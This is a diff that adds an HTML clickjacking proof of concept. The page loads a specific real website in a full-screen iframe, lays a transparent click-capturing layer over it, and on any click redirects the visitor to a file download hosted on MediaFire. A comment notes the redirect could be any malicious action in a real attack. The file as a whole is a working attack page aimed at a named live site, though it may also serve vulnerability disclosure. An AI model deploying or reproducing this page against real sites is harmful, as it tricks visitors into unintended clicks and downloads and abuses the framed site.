@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Clickjacking PoC – Redirect on Click</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+    }
+
+    iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      border: none;
+      z-index: 1;
+    }
+
+    .click-layer {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: transparent;
+      z-index: 2;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Vulnerable site inside iframe -->
+  <iframe src="https://www.pmi.pna.ps/pmia/pmia/"></iframe>
+
+  <!-- Transparent layer that captures clicks -->
+  <div class="click-layer" onclick="redirectUser()"></div>
+
+  <script>
+    function redirectUser() {
+      // Redirect to file (or any malicious or unintended action in a real attack)
+      window.location.href = "https://download1478.mediafire.com/e9lrd8fgahsgMqcBdVm8yTRsR5gMF9d15cI_KRISp7UwykZTZ0-H1_-WzgUMv6DT2vob_3jyRLOiVy5aP8YnciZyfQaKZR3P62JERIWNMjIuloF_2QWdSPPwFui9UyN8KUNRnnT0hF8xDiJhShZdpVMnb0frtW69E2bg8cWiAA/hzlkwpoclizylf8/45b4a5a27yha58a2gxn0uddnh.pdf";
+    }
+  </script>
+
+</body>
+</html>
